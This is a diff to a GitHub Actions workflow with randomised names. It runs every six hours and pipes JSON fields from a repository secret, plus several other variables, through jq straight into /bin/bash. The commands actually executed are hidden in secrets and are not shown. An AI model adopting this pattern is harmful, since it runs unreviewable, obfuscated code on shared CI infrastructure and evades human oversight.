@@ -2,20 +2,26 @@ name: taogongzhu4536
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
+    - cron: '50 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: taogongzhu4536
         env:
-          nsf27480: ${{ secrets.nsf27480 }}
+          hhhtg5: ${{ secrets.hhhtg5 }}
         run: |
-          echo $nsf27480 | jq -r .a6 | /bin/bash
-          echo $qvuax5085 | jq -r .huop92342 | /bin/bash
-          echo $h4 | jq -r .ivman7 | /bin/bash
-          echo $or345 | jq -r .ni17191 | /bin/bash
-          echo $m11 | jq -r .dvj3 | /bin/bash
+          echo $hhhtg5 | jq -r .f6 | /bin/bash
+          echo $dbobz39 | jq -r .wlwxb04658 | /bin/bash
+          echo $ssyqe36 | jq -r .bs2 | /bin/bash
+          echo $k8 | jq -r .rpo31 | /bin/bash
+          echo $zxirv96 | jq -r .fftwo60 | /bin/bash
+          echo $bn59204 | jq -r .ptohh7 | /bin/bash
+          echo $fck8299 | jq -r .ste7 | /bin/bash
+          echo $lllu2 | jq -r .wq7 | /bin/bash
+          echo $crr100 | jq -r .of51459 | /bin/bash
+          echo $d4 | jq -r .hvjc13 | /bin/bash
 
